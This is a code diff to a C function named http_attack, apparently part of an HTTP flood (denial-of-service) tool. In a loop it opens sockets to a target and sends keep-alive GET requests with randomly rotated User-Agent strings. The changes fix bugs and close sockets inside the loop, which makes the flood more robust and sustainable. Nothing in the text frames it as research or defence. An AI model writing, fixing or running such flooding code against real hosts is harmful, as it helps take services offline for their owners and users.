@@ -1,12 +1,14 @@
 #include <stdio.h>
 #include <string.h>
 #include <time.h>
-#include "http_attack.h"
+#include "headers/http_attack.h"
 
 void* http_attack(void* arg) {
     attack_params* params = (attack_params*)arg;
-    int sock;
+    if (!params) return NULL;
+    int sock = -1;
     struct sockaddr_in target_addr;
+    memset(&target_addr, 0, sizeof(target_addr));
     target_addr.sin_family = AF_INET;
     target_addr.sin_port = params->target_addr.sin_port;
     target_addr.sin_addr = params->target_addr.sin_addr;
@@ -28,13 +30,13 @@ void* http_attack(void* arg) {
         if (sock < 0) continue;
 
         if (connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr)) == 0) {
-            char buffer[1024];
+            char buffer[1024] = {0};
             const char* user_agent = user_agents[rand() % (sizeof(user_agents) / sizeof(user_agents[0]))];
             snprintf(buffer, sizeof(buffer), "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: keep-alive\r\n\r\n",
                      inet_ntoa(params->target_addr.sin_addr), user_agent);
             send(sock, buffer, strlen(buffer), 0);
         }
+        close(sock);
     }
-    close(sock);
     return NULL;
 }
